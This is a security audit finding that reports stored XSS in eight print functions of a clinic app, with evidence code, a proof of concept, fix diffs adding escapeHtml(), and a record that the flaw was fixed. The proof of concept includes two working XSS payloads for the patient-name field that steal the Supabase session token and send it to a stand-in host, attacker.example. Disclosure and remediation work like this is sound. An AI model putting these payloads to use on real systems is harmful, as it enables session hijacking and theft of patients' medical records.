# Stored XSS via Unescaped Patient Data in document.write() Print Functions

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-08-20 03:14:18 UTC
**Target:** https://github.com/chefe-coruja (local: /workspace/chefe-coruja)
**Endpoint:** /plantao/* — all authenticated print routes consuming DadosPaciente
**CWE:** CWE-79
**CVSS:** 8.7
**Fix Effort:** Low

## Description

Eight medical document print functions inject user-controlled patient data (name, allergies, diagnosis, prescriptions, exam requests, clinical notes) directly into `document.write()` template strings without HTML encoding. Because patient records are loaded from the shared Supabase database, any authenticated user who can write to the `pacientes` table can plant an XSS payload that executes whenever another authenticated user prints a document for that patient.

## Evidence

```
// ReceituarioMedico.tsx lines 148–169 (representative; identical pattern in all 8 files)
printWindow.document.write(`
  ...
  <div class="rec-cabec">
    <span><strong>Paciente:</strong> ${dados.paciente.nome || '____________________'}</span>
    <span><strong>Data:</strong> ${fmtData(dados.paciente.dataAtual) || '____/___/____'}</span>
  </div>
  ${alergia}   // `⚠️ ALERGIA: ${dados.paciente.alergias.toUpperCase()} ⚠️` — no escaping
  ${itens.length ? `<table>...<tbody>${linhas}</tbody></table>` : '...'}
  ...
  ${dados.receita.obs ? `<div class="obs">Observações: ${dados.receita.obs}</div>` : ''}
  ...
`)
```

```
// EvolucaoTab.tsx lines 61–68 — allergy + clinical note unescaped
const alergiaHtml =
  `...⚠️ ALERGIA: ${dados.alergias.toUpperCase()} ⚠️...`
const textoHtml = evolucao.texto.replace(/\n/g, '<br>')   // no prior escapeHtml()
printWindow.document.write(`...${dados.nome}...${alergiaHtml}...${textoHtml}...`)
```

```
// ExportarTab.tsx (SAFE reference — correctly uses escapeHtml):
const textoHtml = escapeHtml(evolucao.texto).replace(/\n/g, '<br>')
`...${escapeHtml(dados.nome || '____________________')}...`
```

```
// src/lib/utils.ts — escapeHtml helper exists and is correct:
export function escapeHtml(s: string | null | undefined): string {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
```
Patient names and other fields are loaded directly from the Supabase `pacientes` table without sanitization before being written to the print popup.

## Impact

A malicious actor who can create or modify a patient record can inject arbitrary JavaScript that executes in the same-origin print popup (`window.open('', '_blank')`). Because the popup inherits the opener's origin, it has full read access to `localStorage`, including the Supabase session token persisted there by the `@supabase/supabase-js` client. Exploitation enables session hijacking, medical-record exfiltration, and authenticated API actions on behalf of the victim without requiring any additional user interaction beyond clicking "Imprimir".

## Technical Analysis

The `imprimir()` function in each of the following components calls `window.open('', '_blank')` to spawn a print popup, then populates it via `printWindow.document.write(html)` where `html` is a template-literal string that embeds patient fields **without HTML encoding**:

**Affected files and unescaped sinks:**

- `src/pages/plantao/atendimento/ReceituarioMedico.tsx` (line 148): `dados.paciente.nome`, `dados.paciente.alergias`, per-item `medicamento`, `dose`, `posologia`, `quantidade`, `receita.obs`
- `src/pages/plantao/atendimento/Encaminhamento.tsx` (line 95): `dados.paciente.nome`, `dados.paciente.diagnostico`, `encaminhamento.resumo`
- `src/pages/plantao/atendimento/PedidoExames.tsx` (line 113): `dados.paciente.nome`, each exam line
- `src/pages/plantao/atendimento/AtestadoMedico.tsx` (line 87): `dados.paciente.nome`, `atestado.texto`
- `src/pages/plantao/internacao/PrescricaoTab.tsx` (line 144): `dados.nome`, `dados.alergias`, `prescricao.obs`
- `src/pages/plantao/internacao/EvolucaoTab.tsx` (line 71): `dados.nome`, `dados.nascimento`, `dados.leito`, `dados.diagnostico`, `dados.alergias`, `evolucao.texto`
- `src/pages/plantao/internacao/ExamesTab.tsx` (line 67): `dados.nome`, each exam line
- `src/pages/plantao/internacao/InternacaoTab.tsx` (line 106): all AIH field values (`aih[c.nome]`) — textarea rows call `.replace(/\n/g, '<br>')` on the raw value without prior escaping

Patient data reaches these sinks through `DadosPaciente` (component search loads `pacienteEncontrado.nome` etc. from Supabase `pacientes` table) or from `localStorage` drafts (rascunho) that may themselves have been seeded from DB data.

Contrast with `ExportarTab.tsx`, which correctly wraps every patient field in `escapeHtml()` before building the same-style HTML template — the helper exists in `src/lib/utils.ts` and is not applied in any of the eight print functions above.

The popup window opened with `window.open('', '_blank')` receives the opener's origin (`about:blank` inherits the creating document's origin), so injected script can read `window.localStorage` directly (same origin) and access the `sb-*-auth-token` key written by the Supabase JS client.

## Proof of Concept

1. Log in as any authenticated user who has write access to the `pacientes` table (e.g., a plantonista who can register a new patient).
2. Create or edit a patient record and set the **Nome** field to the payload: `<img src=x onerror="window.opener.fetch('https://attacker.example/exfil?t='+encodeURIComponent(window.localStorage.getItem(Object.keys(window.localStorage).find(k=>k.includes('auth'))))||'none')">`.
3. As a victim (another authenticated user), search for that patient in any of the medical document tabs (e.g., Receituário, Encaminhamento, Prescrição).
4. Click **Imprimir**.
5. Observe the JavaScript execute in the print popup and the Supabase session token exfiltrated to the attacker's endpoint.
6. The attack works identically with the **Alergias**, **Diagnóstico**, **Observações**, or any free-text prescription/exam field.

```typescript
// Demonstrates the sink in ReceituarioMedico.tsx (same pattern in all 8 files)
// The vulnerable template literal (lines 148-169, ReceituarioMedico.tsx):

function imprimir() {
  // dados.paciente.nome sourced from Supabase — no HTML encoding applied
  printWindow.document.write(`
    ...
    <div class="rec-cabec">
      <span><strong>Paciente:</strong> ${dados.paciente.nome || '____________________'}</span>
    </div>
    ...
    ${alergia}   // built with: `⚠️ ALERGIA: ${dados.paciente.alergias.toUpperCase()} ⚠️`
    ...
  `)
}

// Payload stored in pacientes.nome:
// <img src=x onerror="fetch('https://attacker.example/?t='+btoa(localStorage.getItem(Object.keys(localStorage).find(k=>k.endsWith('-auth-token')))))">
//
// When imprimir() runs, document.write renders:
//   <span><strong>Paciente:</strong> <img src=x onerror="...exfil..."></span>
// The onerror handler executes in the same-origin popup, reads localStorage,
// and sends the Supabase JWT to the attacker.
```

## Code Analysis

**Location 1:** `src/pages/plantao/atendimento/ReceituarioMedico.tsx` (lines 148-169)
  ReceituarioMedico — patient name, allergies, medication items, observations unescaped in document.write()
  ```
      printWindow.document.write(`
        <html><head><title>Receituário</title>
        ...
            <div class="rec-cabec"><span><strong>Paciente:</strong> ${dados.paciente.nome || '____________________'}</span>...
            ${alergia}
            ...<tbody>${linhas}</tbody>...
            ${dados.receita.obs ? `<div class="obs">Observações: ${dados.receita.obs}</div>` : ''}
          </div></div>
        </body></html>
      `)
  ```

  **Suggested Fix:**
```diff
-     printWindow.document.write(`
-       <html><head><title>Receituário</title>
-       <style>
-         @page{size:A4 portrait;margin:0}
-         html,body{margin:0;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact}
-         .folha{position:relative;width:210mm;min-height:297mm;padding:18mm;box-sizing:border-box;background:#fff}
-         .rec{border:2px solid #000;background:#fff;padding:8mm;border-radius:6px;min-height:245mm;box-sizing:border-box}
-         .rec-titulo{text-align:center;font-size:15px;font-weight:800;letter-spacing:1px;text-transform:uppercase;border-bottom:2px solid #000;padding-bottom:4mm;margin-bottom:8mm}
-         .rec-cabec{display:flex;justify-content:space-between;font-size:12px;margin-bottom:6mm;border:1px solid #000;padding:4mm 5mm}
-         table{border-collapse:collapse;width:100%;font-size:12px;color:#000}
-         th{background:#f1f5f9;border:1px solid #000;padding:5px;font-size:10px;text-transform:uppercase}
-         .ass{margin-top:18mm;text-align:center;font-size:12px}
-         .obs{margin-top:8mm;border:1px dashed #000;padding:4mm;font-size:11px}
-       </style></head>
-       <body>
-         <div class="folha"><div class="rec" style="background:${corTipo(dados.receita.tipo)};">
-           <div class="rec-titulo">Receituário ${TIPO_RECEITUARIO.find((t) => t.value === dados.receita.tipo)?.label.toUpperCase()}</div>
-           <div class="rec-cabec"><span><strong>Paciente:</strong> ${dados.paciente.nome || '____________________'}</span><span><strong>Data:</strong> ${fmtData(dados.paciente.dataAtual) || '____/___/____'}</span></div>
-           ${alergia}
-           ${itens.length ? `<table><thead><tr><th style="width:6%;text-align:center;">Nº</th><th>Medicamento</th><th style="width:9%;">Qtd</th></tr></thead><tbody>${linhas}</tbody></table>` : '<p style="text-align:center;color:#999;">Nenhum item preenchido.</p>'}
-           <div class="ass">_________________________________________<br>Assinatura / Carimbo do Médico</div>
-           ${dados.receita.obs ? `<div class="obs">Observações: ${dados.receita.obs}</div>` : ''}
-         </div></div>
-       </body></html>
-     `)
+     import { escapeHtml } from '@/lib/utils'
+     // Apply escapeHtml() to every patient field before interpolation:
+     // e.g. ${escapeHtml(dados.paciente.nome) || '____________________'}
+     // e.g. alergia = `...ALERGIA: ${escapeHtml(dados.paciente.alergias.toUpperCase())}...`
+     // e.g. linhas: `<strong>${escapeHtml(i.medicamento.toUpperCase())}</strong>...`
+     // e.g. obs: `...Observações: ${escapeHtml(dados.receita.obs)}</div>`
```

**Location 2:** `src/pages/plantao/internacao/EvolucaoTab.tsx` (lines 61-99)
  EvolucaoTab — allergy string and clinical note text unescaped; fix: escape before newline replacement
  ```
      const alergiaHtml =
        dados.alergias && dados.alergias.toUpperCase() !== 'NEGA'
          ? `<div ...>⚠️ ALERGIA: ${dados.alergias.toUpperCase()} ⚠️</div>`
          : ''
      const textoHtml = evolucao.texto.replace(/\n/g, '<br>')
  ```

  **Suggested Fix:**
```diff
-     const alergiaHtml =
-       dados.alergias && dados.alergias.toUpperCase() !== 'NEGA'
-         ? `<div style="background:#dc2626;color:#fff;padding:4px;text-align:center;font-weight:800;font-size:11px;margin-bottom:8px;">⚠️ ALERGIA: ${dados.alergias.toUpperCase()} ⚠️</div>`
-         : ''
-     const cabecalho = evolucao.tipo === 'admissao' ? 'TERMO DE ADMISSÃO' : 'EVOLUÇÃO MÉDICA'
-     const textoHtml = evolucao.texto.replace(/\n/g, '<br>')
+     import { escapeHtml } from '@/lib/utils'
+     const alergiaHtml =
+       dados.alergias && dados.alergias.toUpperCase() !== 'NEGA'
+         ? `<div style="background:#dc2626;color:#fff;padding:4px;text-align:center;font-weight:800;font-size:11px;margin-bottom:8px;">⚠️ ALERGIA: ${escapeHtml(dados.alergias.toUpperCase())} ⚠️</div>`
+         : ''
+     const cabecalho = evolucao.tipo === 'admissao' ? 'TERMO DE ADMISSÃO' : 'EVOLUÇÃO MÉDICA'
+     const textoHtml = escapeHtml(evolucao.texto).replace(/\n/g, '<br>')
```

**Location 3:** `src/pages/plantao/internacao/ExamesTab.tsx` (lines 57-65)
  ExamesTab — patient name and exam lines unescaped
  ```
      const paciente = dados.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'
      ...
      const listaHtml = linhas.map((l) => `<div ...>• ${l}</div>`).join('')
  ```

  **Suggested Fix:**
```diff
-     const paciente = dados.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'
-     const data = fmtData(dados.dataAtual)
-     const linhas = texto.split(/\n+/).map((l) => l.replace(/^[-*•]\s*/, '')).filter(Boolean)
-     const listaHtml = linhas.map((l) => `<div style="margin-bottom:6px;">• ${l}</div>`).join('')
+     import { escapeHtml } from '@/lib/utils'
+     const paciente = escapeHtml(dados.nome.trim().toUpperCase()) || 'PACIENTE NÃO IDENTIFICADO'
+     const data = fmtData(dados.dataAtual)
+     const linhas = texto.split(/\n+/).map((l) => l.replace(/^[-*•]\s*/, '')).filter(Boolean)
+     const listaHtml = linhas.map((l) => `<div style="margin-bottom:6px;">• ${escapeHtml(l)}</div>`).join('')
```

**Location 4:** `src/pages/plantao/atendimento/PedidoExames.tsx` (lines 107-115)
  PedidoExames — patient name and exam list unescaped
  ```
      const paciente = dados.paciente.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'
      ...
      const listaHtml = linhas.map((l) => `<div ...>• ${l}</div>`).join('')
  ```

  **Suggested Fix:**
```diff
-     const paciente = dados.paciente.nome.trim().toUpperCase() || 'PACIENTE NÃO IDENTIFICADO'
-     const data = fmtData(dados.paciente.dataAtual)
-     const linhas = texto.split(/\n+/).map((l) => l.replace(/^[-*•]\s*/, '')).filter(Boolean)
-     const listaHtml = linhas.map((l) => `<div style="margin-bottom:6px;">• ${l}</div>`).join('')
+     import { escapeHtml } from '@/lib/utils'
+     const paciente = escapeHtml(dados.paciente.nome.trim().toUpperCase()) || 'PACIENTE NÃO IDENTIFICADO'
+     const data = fmtData(dados.paciente.dataAtual)
+     const linhas = texto.split(/\n+/).map((l) => l.replace(/^[-*•]\s*/, '')).filter(Boolean)
+     const listaHtml = linhas.map((l) => `<div style="margin-bottom:6px;">• ${escapeHtml(l)}</div>`).join('')
```

**Location 5:** `src/pages/plantao/internacao/InternacaoTab.tsx` (lines 99-107)
  InternacaoTab — all AIH field values (val) unescaped; textarea rows use .replace() on raw value
  ```
      const rows = campos
        .map((c) => {
          const val = aih[c.nome]
          if (c.textarea) {
            return `<div ...><div ...>${c.rotulo}</div><div ...>${(val || '&nbsp;').replace(/\n/g, '<br>')}</div></div>`
          }
          return `<div ...><div ...>${c.rotulo}</div><div ...>${val || '&nbsp;'}</div></div>`
        })
        .join('')
  ```

  **Suggested Fix:**
```diff
-     const rows = campos
-       .map((c) => {
-         const val = aih[c.nome]
-         if (c.textarea) {
-           return `<div class="row"><div class="label">${c.rotulo}</div><div class="valor ta">${(val || '&nbsp;').replace(/\n/g, '<br>')}</div></div>`
-         }
-         return `<div class="row"><div class="label">${c.rotulo}</div><div class="valor">${val || '&nbsp;'}</div></div>`
-       })
-       .join('')
+     import { escapeHtml } from '@/lib/utils'
+     const rows = campos
+       .map((c) => {
+         const val = aih[c.nome]
+         if (c.textarea) {
+           return `<div class="row"><div class="label">${escapeHtml(c.rotulo)}</div><div class="valor ta">${(escapeHtml(val) || '&nbsp;').replace(/\n/g, '<br>')}</div></div>`
+         }
+         return `<div class="row"><div class="label">${escapeHtml(c.rotulo)}</div><div class="valor">${escapeHtml(val) || '&nbsp;'}</div></div>`
+       })
+       .join('')
```

## Remediation

Apply `escapeHtml()` — which already exists in `src/lib/utils.ts` and is correctly used in `ExportarTab.tsx` — to every patient field before it is interpolated into a `document.write()` template string. This must be done in all eight affected components.

For fields that convert newlines to `<br>` tags (e.g., `evolucao.texto.replace(/\n/g, '<br>')`), escape the value first and then replace the escaped newlines: `escapeHtml(text).replace(/\n/g, '<br>')`. The pattern already used in `ExportarTab.tsx` (lines 139, 163, 179) is the correct reference.

Additionally, consider replacing `document.write()` with `document.open(); document.write(...); document.close()` on the opener side, or — better — build the print content as a Blob URL or a sandboxed iframe to isolate it from the main window's storage. As a defence-in-depth measure, set a strict `Content-Security-Policy` header on the application that blocks inline script unless nonce/hash-protected.

## Assumptions

Assumes an attacker has at minimum authenticated access to create or edit a patient record (plantonista or gestor role). The victim needs only to search for the patient and click Imprimir — no further interaction is required. Supabase session tokens are confirmed to be stored in `localStorage` under the default `@supabase/supabase-js` configuration (key `sb-*-auth-token`).

## Remediation Status: ✅ FIXED (2026-08-20)

`escapeHtml()` from `src/lib/utils.ts` was applied to **all 8 affected components** — every patient
field is escaped before interpolation into the `document.write()` template, and newline→`<br>` fields
escape first (`escapeHtml(text).replace(/\n/g, '<br>')`), exactly as recommended:

| # | Arquivo | Campos escapados |
|---|---|---|
| 1 | `src/pages/plantao/atendimento/ReceituarioMedico.tsx` | nome, alergias, medicamento, dose, posologia, quantidade, obs |
| 2 | `src/pages/plantao/atendimento/Encaminhamento.tsx` | nome, diagnostico, especialidade, prioridade, resumo |
| 3 | `src/pages/plantao/atendimento/PedidoExames.tsx` | paciente, linhas de exame |
| 4 | `src/pages/plantao/atendimento/AtestadoMedico.tsx` | nome, dias, cid, texto |
| 5 | `src/pages/plantao/internacao/PrescricaoTab.tsx` | med, via, pos, apr, alergias, nome, leito, diagnostico, obs |
| 6 | `src/pages/plantao/internacao/EvolucaoTab.tsx` | alergias, evolucao.texto, nome, nascimento, leito, diagnostico |
| 7 | `src/pages/plantao/internacao/ExamesTab.tsx` | paciente, linhas de exame |
| 8 | `src/pages/plantao/internacao/InternacaoTab.tsx` | rotulo, val (formulário AIH) |

Verification: `tsc -b --noEmit` clean, `eslint .` 0 errors, `vite build` OK, testes 43/43 (29
terminologia + 10 observacao + 4 interop). A defense-in-depth CSP é deixada como recomendação
futura (issue de hardening, não bloqueante).
